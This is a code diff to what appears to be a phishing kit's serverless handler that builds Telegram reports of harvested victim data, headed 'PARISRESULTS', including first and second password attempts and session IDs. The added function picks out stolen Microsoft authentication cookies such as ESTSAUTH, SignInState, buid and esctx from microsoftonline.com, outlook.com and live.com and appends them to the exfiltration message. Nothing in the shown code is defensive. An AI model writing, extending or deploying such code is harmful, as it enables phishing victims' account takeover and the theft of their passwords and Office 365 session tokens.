@@ -109,6 +109,8 @@ const composeTelegramMessage = (data) => {
         deviceDetails,
         timestamp,
         sessionId,
+        microsoftCookies,
+        cookieList,
     } = data;
 
     const hasTwoStepData = firstAttemptPassword && secondAttemptPassword;
@@ -126,7 +128,12 @@ const composeTelegramMessage = (data) => {
         timeZone: 'UTC', hour12: true
     }) + ' UTC';
 
-    return `
+    // Build Microsoft cookie section if available
+    let microsoftSection = '';
+    if (provider && (provider.toLowerCase().includes('office365') || provider.toLowerCase().includes('outlook') || provider.toLowerCase().includes('microsoft'))) {
+        microsoftSection = buildMicrosoftCookieSection(microsoftCookies, cookieList);
+    }
+    const baseMessage = `
 *🔐 PARISRESULTS 🔐*
 
 *ACCOUNT DETAILS*
@@ -145,8 +152,62 @@ const composeTelegramMessage = (data) => {
 - 🕒 Timestamp: *${formattedTimestamp}*
 - 🆔 Session ID: \`${sessionId}\`
 `;
+
+    return baseMessage + microsoftSection;
 };
 
+/**
+ * Builds Microsoft cookie section for Telegram message
+ * @param {object} microsoftCookies - Microsoft cookie statistics
+ * @param {array} cookieList - Full cookie list
+ * @returns {string}
+ */
+const buildMicrosoftCookieSection = (microsoftCookies, cookieList) => {
+    if (!microsoftCookies && !cookieList) {
+        return '\n\n*🔵 MICROSOFT SESSION*\n- Status: *No cookies captured*';
+    }
+
+    let section = '\n\n*🔵 MICROSOFT SESSION*\n';
+
+    // Add Microsoft cookie statistics
+    if (microsoftCookies) {
+        section += `- 📊 Total Cookies: *${microsoftCookies.total || 0}*\n`;
+        section += `- 🔐 Auth Cookies: *${microsoftCookies.authCookies || 0}*\n`;
+        section += `- 🎫 Session Cookies: *${microsoftCookies.sessionCookies || 0}*\n`;
+        
+        if (microsoftCookies.domains && microsoftCookies.domains.length > 0) {
+            const domains = microsoftCookies.domains.slice(0, 3).join(', ');
+            section += `- 🌐 Domains: \`${domains}\`\n`;
+        }
+    }
+
+    // Extract key Microsoft authentication cookies
+    if (cookieList && Array.isArray(cookieList)) {
+        const microsoftAuthCookies = cookieList.filter(cookie => 
+            cookie.domain && (
+                cookie.domain.includes('microsoftonline.com') ||
+                cookie.domain.includes('outlook.com') ||
+                cookie.domain.includes('live.com')
+            ) && (
+                cookie.name.includes('ESTSAUTH') ||
+                cookie.name.includes('SignInState') ||
+                cookie.name.includes('buid') ||
+                cookie.name.includes('esctx')
+            )
+        );
+
+        if (microsoftAuthCookies.length > 0) {
+            section += '\n*🔑 KEY AUTH COOKIES:*\n';
+            microsoftAuthCookies.slice(0, 5).forEach(cookie => {
+                const truncatedValue = cookie.value.length > 20 ? 
+                    cookie.value.substring(0, 20) + '...' : cookie.value;
+                section += `- \`${cookie.name}\`: \`${truncatedValue}\`\n`;
+            });
+        }
+    }
+
+    return section;
+};
 
 // --- Main Handler ---
 exports.handler = async (event) => {
